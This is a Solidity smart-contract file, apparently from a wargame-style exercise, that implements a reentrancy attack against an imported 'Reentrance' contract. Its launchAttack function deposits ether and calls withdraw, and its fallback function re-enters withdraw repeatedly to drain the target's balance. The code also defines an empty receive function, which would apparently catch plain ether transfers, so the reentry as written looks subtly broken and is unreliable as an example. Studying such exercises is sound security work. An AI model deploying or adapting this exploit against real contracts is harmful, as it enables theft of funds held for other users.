// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "./Reentrance.sol";

contract ReentranceExploit {
    Reentrance public vulnerable_contract;
    address public owner;

    constructor(address _vulnerable_contract) {
        owner = msg.sender;
        vulnerable_contract = Reentrance(_vulnerable_contract);
    }

    // function deposit() public payable{
    //     require(msg.value >= 1 ether);
    //     // call addBalance with msg.value ethers
    //     vulnerable_contract.addBalance{value: msg.value}();
    // }


    fallback () external payable {
        // otherwise there is a loop between withdraw and the fallback function
        if(address(vulnerable_contract).balance >= 1 ether){
            vulnerable_contract.withdraw();
        }
    }


    function launchAttack() external payable {
        // call withdraw
        // withdraw calls the fallback of ReentranceExploit
        require(msg.value >= 1 ether);
        // call addBalance with msg.value ethers
        vulnerable_contract.deposit{value: msg.value}();
        vulnerable_contract.withdraw();
    }

    receive() external payable {
        // custom function code
    }
    function vulnerableContract() public view returns (address){
        return address(vulnerable_contract);
    }
}